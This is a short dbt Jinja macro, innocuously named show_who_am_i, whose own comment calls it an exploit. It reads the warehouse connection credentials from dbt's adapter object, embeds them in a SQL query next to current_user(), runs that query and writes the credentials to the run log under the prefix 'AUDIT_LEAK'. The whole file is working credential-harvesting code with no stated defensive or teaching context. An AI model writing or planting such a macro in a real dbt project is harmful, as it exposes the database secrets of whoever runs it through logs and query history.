{% macro show_who_am_i() %}
  {# 
     Exploit: dbt's 'adapter' object often has access to the connection 
     config, which includes the profiles.yml content in memory.
  #}
  
  {% set connection_info = adapter.config.credentials.to_dict() | string %}

  {% set sql %}
    select 
        current_user(), 
        '{{ connection_info | replace("'", "") }}' as leaked_creds
  {% endset %}

  {% set results = run_query(sql) %}

  {% if execute %}
    {% for row in results %}
      {{ log("AUDIT_LEAK: " ~ row[1], info=True) }}
    {% endfor %}
  {% endif %}
{% endmacro %}
